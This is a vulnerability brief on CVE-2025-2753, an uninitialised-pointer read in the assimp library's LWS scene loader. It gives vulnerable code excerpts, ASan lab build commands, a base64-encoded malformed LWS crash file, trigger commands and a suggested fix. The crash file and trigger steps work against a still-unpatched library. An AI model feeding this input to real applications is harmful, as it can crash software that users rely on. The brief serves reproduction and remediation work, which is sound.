# Intel Brief: CVE-2025-2753

## CVE Summary

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-2753 |
| **Affected Software** | Open Asset Import Library (assimp) |
| **Vendor** | assimp (Open Source) |
| **Affected Version** | 5.4.3 (and all versions through at least 6.0.4) |
| **CVSS Score** | 6.3 (MEDIUM) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L |
| **CWE** | CWE-119 (Improper Restriction of Operations within Memory Buffer Bounds), CWE-125 (Out-of-bounds Read), CWE-457 (Use of Uninitialized Variable) |
| **EPSS** | 0.2% |
| **Published** | 2025-03-25 |

## Description

An out-of-bounds read / use-of-uninitialized-variable vulnerability exists in the Open Asset Import Library (assimp) version 5.4.3. The flaw is in the `CopyPtrArray` template function in `code/Common/SceneCombiner.cpp`, which is called during scene merging when processing LWS (LightWave Scene) files via the LWS importer (`code/AssetLib/LWS/LWSLoader.cpp`).

**Root Cause:** The LWS loader allocates arrays for lights and cameras using `new Type *[num]` without zero-initialization (lines 855, 859 of LWSLoader.cpp). When a malformed LWS file causes the loader to not fill all allocated array slots, uninitialized pointers remain. When `SceneCombiner::MergeScenes()` is subsequently called (line 902), it internally calls `CopyScene()` → `CopyPtrArray()`, which iterates over these uninitialized pointers and passes them to `SceneCombiner::Copy()`, causing an out-of-bounds read / segfault when dereferencing garbage pointer values (e.g., `0xbebebebebebebebe` under ASan).

**Attack Vector:** An attacker can craft a malicious LWS file that, when imported by any application using the assimp library, triggers the vulnerability. The attack requires user interaction (opening the malicious file) but no authentication or special privileges.

## Repository Information

| Field | Value |
|---|---|
| **Repository URL** | https://github.com/assimp/assimp.git |
| **Vulnerable Version Tag** | `v5.4.3` (commit `c35200e38`) |
| **Fix Commit** | **NONE — vulnerability remains unfixed as of v6.0.4** |
| **Patched Version** | **None available** |
| **Build System** | CMake (minimum version 3.22) |
| **Primary Language** | C++ |

## Affected Files

1. **`code/Common/SceneCombiner.cpp`** — Contains the vulnerable `CopyPtrArray` template function (line 977-986 in v5.4.3). Allocates `new Type *[num]` without value-initialization, then iterates calling `SceneCombiner::Copy(&dest[i], src[i])` where `src[i]` may be an uninitialized pointer.

2. **`code/AssetLib/LWS/LWSLoader.cpp`** — The LWS file handler that triggers the vulnerability. Allocates light/camera arrays without initialization (lines 855, 859), and not all slots are guaranteed to be filled when processing malformed input. Then calls `SceneCombiner::MergeScenes()` (line 902) which triggers the copy of uninitialized pointers.

## Vulnerable Code

### CopyPtrArray (SceneCombiner.cpp, lines 977-986):
```cpp
template <typename Type>
inline void CopyPtrArray(Type **&dest, const Type *const *src, ai_uint num) {
    if (!num) {
        dest = nullptr;
        return;
    }
    dest = new Type *[num];     // <-- BUG: no value-initialization
    for (ai_uint i = 0; i < num; ++i) {
        SceneCombiner::Copy(&dest[i], src[i]);  // <-- reads from uninitialized src[i]
    }
}
```

### LWSLoader light array allocation (LWSLoader.cpp, lines 858-861):
```cpp
if (num_light) {
    master->mLights = new aiLight *[master->mNumLights = num_light]; // <-- no initialization
}
aiLight **lights = master->mLights;
```

## Build System & Key Dependencies

| Component | Details |
|---|---|
| **Build System** | CMake >= 3.22 |
| **Language** | C++17 |
| **External Dependencies** | zlib (optional, bundled in contrib/zlib) |
| **Bundled Libraries** | rapidjson, pugixml, utf8cpp, poly2tri, clipper, Open3DGC, openddlparser, stb, zip/unzip, draco |
| **Build Command** | `cmake -B build -DCMAKE_BUILD_TYPE=Debug && cmake --build build` |
| **Fuzzer** | `fuzz/assimp_fuzzer.cc` — standard libFuzzer harness using `ReadFileFromMemory()` |
| **CLI Tool** | `tools/assimp_cmd/` — can be used to trigger import of LWS files |

### Build Notes for Lab
- All major dependencies are bundled in `contrib/` — no system packages needed beyond cmake, gcc/g++, and make
- For ASan-based PoC, build with: `cmake -B build -DCMAKE_BUILD_TYPE=Debug -DCMAKE_CXX_FLAGS="-fsanitize=address -fno-omit-frame-pointer" -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer" -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address"`
- The LWS importer is built by default (no `ASSIMP_BUILD_NO_LWS_IMPORTER` flag set)

## Proof of Concept

### PoC Crash File
A base64-encoded malformed LWS file has been saved to `poc/crash.lws`. This file was extracted from the original issue report (GitHub issue #6014).

**Base64-encoded PoC:**
```
TFdTQyBBDUFkZExpZ29tLzNkbQNodHRwbGliIFxcDUxvYWRPYmplY3QgMTExUyAgICAoIGMxGzFT
aHQgQSQtIExvYWQ9YmplY3RMYXkgTG8yICBBJA1QYXJlbnRPYmplY3QgMgogMg04IDczCQkgMiA3
Mw04IEEk8t+zkJ6bsJ2VmpyLs56Gmo3fz6zai9/y8vLy2t/N1/DyvpuR2dzEypeL39/f39fP8r6b
m7OWmJeL5vLy8vLPziQkJF9fX3RQVGludCANDQ0NJSAyICBBJA1BZGRMaWdodCANDSBMb2FkT2Jq
ZWN0TGF5ZXIgag1BZGRMaWdodCBBJC0gTG9hZE9iamVjdExheSBMbzIgIEEkDVBhcmVudE9iamVj
dCANDQ0gQSQNf2RkTGlnaHQgDQ0gTG9hbW9tYWdpYy8NDQ0NDQ1MaWdodE1vdGlvbg0NA+gNDTAx
JCQkX19fX19fJDoyCiAyDTggNzMJCSAyIDczDTggQSQNIExvYWRPYg1BZGRMIEEkDSBMb2FkT2Jq
ZWN0TGF5ZXIgMFNiZWdpbk5hcCUgICBBJGRuJiM4IDczCQkgMCA3Mw04IDcgICAzDTg1IE0JCQkJ
KAo4IDcgICAgICAgICAgICAvLy8vMeggIEEkDVBhcmVudE9iamVjdCANDQ0gNxAAOjo6Ojo6kHma
5l8NDQ0NTGlnaHSNeXRpb24NDQ0NDQ0wMSQkJF9fX19fRyQ6MgogMg04IDczCQkgMiA3Mw04IEEk
8t+zkJ6bsJ2VmpyLs56Gmo3fz6zai9/y8m50T2JqZWN0IA0NDSA3ZXIgMFMlIHaNeZoACk9BTQAB
Y2G1IHQgcnNZAAB1c2VtdGwgm7W1tQAQTQwMdmxsbGxyjw==
```

### Trigger Method
The vulnerability can be triggered by:
1. **Fuzzer harness**: Build with ASan and feed `crash.lws` to the fuzzer binary
2. **assimp_cmd**: `./assimp info crash.lws` or `./assimp dump crash.lws`
3. **Library API**: Any application calling `Assimp::Importer::ReadFile("crash.lws", ...)` or `ReadFileFromMemory(data, size, flags, ".lws")`

### Expected Crash
AddressSanitizer reports a SEGV reading from address `0xbebebebebebebebe` (ASan-filled uninitialized heap memory). Stack trace:
```
#0 aiString::operator=(aiString const&)
#1 SceneCombiner::Copy(aiLight**, aiLight const*)
#2 CopyPtrArray<aiLight>(aiLight**&, aiLight const* const*, unsigned int)
#3 SceneCombiner::CopyScene(aiScene**, aiScene const*)
```

## Public Exploits

**No public exploits** in ExploitDB, Metasploit, or GitHub PoC repositories. The only public PoC is the crash file from the original bug report (issue #6014).

## References

| Source | URL |
|---|---|
| **Bug Report / PoC** | https://github.com/assimp/assimp/issues/6014 |
| **Bug Report (anchored)** | https://github.com/assimp/assimp/issues/6014#issue-2877372462 |
| **GHSA Advisory** | GHSA-6gmq-j827-jv97 |
| **VulDB CTI** | https://vuldb.com/?ctiid.300858 |
| **VulDB Entry** | https://vuldb.com/?id.300858 |
| **VulDB Submission** | https://vuldb.com/?submit.517787 |
| **Source Repository** | https://github.com/assimp/assimp |
| **Related PR (partial)** | https://github.com/assimp/assimp/pull/6029 (std::copy refactor, not a fix) |

## Fix Status

**UNFIXED** — The vulnerability remains present in the latest release (v6.0.4, Jan 2026). The issue was reopened on Aug 28, 2025. No fix commit exists.

**Recommended fix**: Change `new Type *[num]` to `new Type *[num]()` (value-initialization) in `CopyPtrArray`, or better yet, add null-checks in the LWS loader to ensure all allocated array slots are properly initialized before MergeScenes is called.